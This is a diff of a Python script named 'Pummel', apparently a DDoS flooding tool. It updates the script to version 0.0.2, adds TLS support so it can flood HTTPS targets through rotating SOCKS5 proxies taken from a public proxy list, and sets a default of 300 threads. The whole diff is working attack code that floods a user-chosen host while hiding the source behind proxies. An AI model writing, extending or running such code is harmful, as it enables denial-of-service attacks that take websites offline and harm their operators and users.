@@ -7,6 +7,7 @@ import socket
 import sys
 import requests 
 import socks
+import ssl
 
 print('''\r\n
   _____                                _ 
@@ -16,20 +17,31 @@ print('''\r\n
  | |   | |_| | | | | | | | | | | |  __/ |
  |_|    \__,_|_| |_| |_|_| |_| |_|\___|_|
  ========================================
- version 0.0.1
+ version 0.0.2
                     Code By HC the Chlous
+    [!!!HTTPS-PROXY FLOODING ADDED!!!]    
  ========================================
  Github: https://github.com/HC133/Pummel \r\n''')
 
 ip = str(input("Address/Host:"))
-page = str(input("Page:"))
-port = int(input("Port:"))
-thread_num = int(input("Threads:"))
+page = str(input("Page (default =/):"))
+if page == "":
+    page = "/"
+port = str(input("Port (HTTPS =443):"))
+if port =="":
+    port = 80
+else:
+    port = int(port)
+th_num = str(input("Threads:"))
+if th_num == "":
+    th_num = int(300)
+else:
+    th_num = int(th_num)
 N = str(input("Do you need to download socks5 list ?(y/n):"))
 if N == 'y':
     f = open("socks5.txt", 'wb')
     try:
-        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
+        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1000")
         f.write(r.content)
     except:
         pass
@@ -80,6 +92,9 @@ def run():
         try:
             socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
             s = socks.socksocket()
+            if port == 443:
+                ctx = ssl.SSLContext()#credits to leeon123
+                s = ctx.wrap_socket(s,server_hostname=str(ip))
             s.connect((str(ip), int(port)))
             s.send(str.encode(request))
             try:
@@ -92,7 +107,7 @@ def run():
 
 n=0
 
-for i in range(thread_num):
+for i in range(th_num):
     th = threading.Thread(target=run,daemon=True)
     th.start()
 
